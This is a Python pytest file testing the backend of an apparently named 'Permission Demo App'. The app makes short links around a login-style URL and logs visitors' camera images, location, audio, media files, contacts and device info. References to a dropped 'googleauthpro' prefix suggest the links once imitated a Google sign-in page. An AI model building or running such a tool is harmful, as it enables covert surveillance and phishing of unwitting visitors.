"""Backend tests for Permission Demo App: demo-links and visit-logs CRUD.
Updated for iteration_2: short-form demo URL `{FRONTEND_URL}/{code}` (no /googleauthpro/ or /l/ prefix).
"""
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://photo-logger-app-1.preview.emergentagent.com").rstrip("/")
API = f"{BASE_URL}/api"


@pytest.fixture(scope="module")
def session():
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json"})
    return s


# --- Health check ---
def test_root(session):
    r = session.get(f"{API}/")
    assert r.status_code == 200
    assert "message" in r.json()


# --- Create demo link & verify SHORT URL format ---
def test_create_demo_link_short_url_format(session):
    payload = {
        "original_url": "https://example.com/login",
        "permissions": ["camera", "location"],
    }
    r = session.post(f"{API}/demo-links", json=payload, headers={"Origin": BASE_URL})
    assert r.status_code == 200, r.text
    data = r.json()
    assert "demo_code" in data and len(data["demo_code"]) > 0
    assert "demo_url" in data
    # NEW format checks
    assert "/googleauthpro/" not in data["demo_url"], f"demo_url should NOT use /googleauthpro/ prefix: {data['demo_url']}"
    assert "/l/" not in data["demo_url"], f"demo_url should NOT use /l/ prefix: {data['demo_url']}"
    assert "googleauthpro.app" not in data["demo_url"], f"demo_url leaked old domain: {data['demo_url']}"
    # Must be exactly {base}/{code}
    assert data["demo_url"].endswith(f"/{data['demo_code']}"), f"demo_url must end with /{data['demo_code']}: {data['demo_url']}"
    assert data["demo_url"].startswith(BASE_URL), f"demo_url should start with public URL: {data['demo_url']}"
    # Exact: BASE_URL + "/" + code
    assert data["demo_url"] == f"{BASE_URL}/{data['demo_code']}", f"unexpected demo_url: {data['demo_url']}"
    assert data["original_url"] == payload["original_url"]
    assert sorted(data["permissions"]) == sorted(payload["permissions"])
    pytest.demo_code = data["demo_code"]


# --- Origin header path (still produces short URL) ---
def test_create_demo_link_with_custom_origin(session):
    # FRONTEND_URL env var takes precedence so origin header is ignored;
    # output must still be the new short-form on the configured FRONTEND_URL.
    payload = {"original_url": "https://example.com/origin-test", "permissions": ["camera"]}
    r = session.post(f"{API}/demo-links", json=payload, headers={"Origin": "https://random-other-host.example.com"})
    assert r.status_code == 200, r.text
    data = r.json()
    assert "/googleauthpro/" not in data["demo_url"]
    assert "/l/" not in data["demo_url"]
    # New short form
    assert data["demo_url"].endswith(f"/{data['demo_code']}")


# --- GET demo link still works (backward compat for existing codes) ---
def test_get_demo_link_increments_visits(session):
    code = pytest.demo_code
    r1 = session.get(f"{API}/demo-links/{code}")
    assert r1.status_code == 200, r1.text
    d1 = r1.json()
    assert d1["demo_code"] == code
    assert d1["original_url"] == "https://example.com/login"
    visits1 = d1["visits"]

    r2 = session.get(f"{API}/demo-links/{code}")
    assert r2.status_code == 200
    assert r2.json()["visits"] == visits1 + 1


# --- Pre-seeded link from previous iteration still resolvable ---
def test_get_seeded_demo_link(session):
    r = session.get(f"{API}/demo-links/z89vtsOq6Yg")
    # If seed exists, must be 200; if missing, 404 is acceptable
    assert r.status_code in (200, 404)
    if r.status_code == 200:
        d = r.json()
        assert d["demo_code"] == "z89vtsOq6Yg"
        assert "original_url" in d
        assert isinstance(d["permissions"], list)


def test_get_demo_link_not_found(session):
    r = session.get(f"{API}/demo-links/__does_not_exist__")
    assert r.status_code == 404


# --- Visit logs round-trip ---
def test_create_visit_log_and_get(session):
    code = pytest.demo_code
    payload = {
        "demo_code": code,
        "permissions_granted": ["camera", "location"],
        "permissions_denied": [],
        "camera_images": ["data:image/jpeg;base64,AAAA", "data:image/jpeg;base64,BBBB"],
        "location_data": {"latitude": 12.34, "longitude": 56.78, "accuracy": 10},
        "audio_data": "data:audio/webm;base64,XYZ",
        "media_files": [{"type": "image", "name": "a.jpg", "size": 100, "data": "data:image/jpeg;base64,QQ=="}],
        "contacts": [{"name": "Alice", "phone": "+1234", "email": "a@b.com"}],
        "device_info": {"deviceType": "Android", "browser": "Chrome", "os": "Android"},
    }
    r = session.post(f"{API}/visit-logs", json=payload)
    assert r.status_code == 200, r.text
    created = r.json()
    assert created["demo_code"] == code
    assert created["location_data"]["latitude"] == 12.34
    assert created["device_info"]["deviceType"] == "Android"

    g = session.get(f"{API}/visit-logs/{code}")
    assert g.status_code == 200
    logs = g.json()
    assert isinstance(logs, list) and len(logs) >= 1
    log = logs[0]
    assert log["demo_code"] == code
    assert log["device_info"]["browser"] == "Chrome"


# --- List demo links sorted newest first; all must be short-form ---
def test_list_demo_links_sorted(session):
    r = session.post(f"{API}/demo-links", json={
        "original_url": "https://example.com/second",
        "permissions": ["microphone"],
    })
    assert r.status_code == 200
    new_data = r.json()
    second_code = new_data["demo_code"]
    assert new_data["demo_url"] == f"{BASE_URL}/{second_code}"

    list_r = session.get(f"{API}/demo-links")
    assert list_r.status_code == 200
    arr = list_r.json()
    assert isinstance(arr, list) and len(arr) >= 2
    timestamps = [item["created_at"] for item in arr]
    assert timestamps == sorted(timestamps, reverse=True)
    assert arr[0]["demo_code"] == second_code
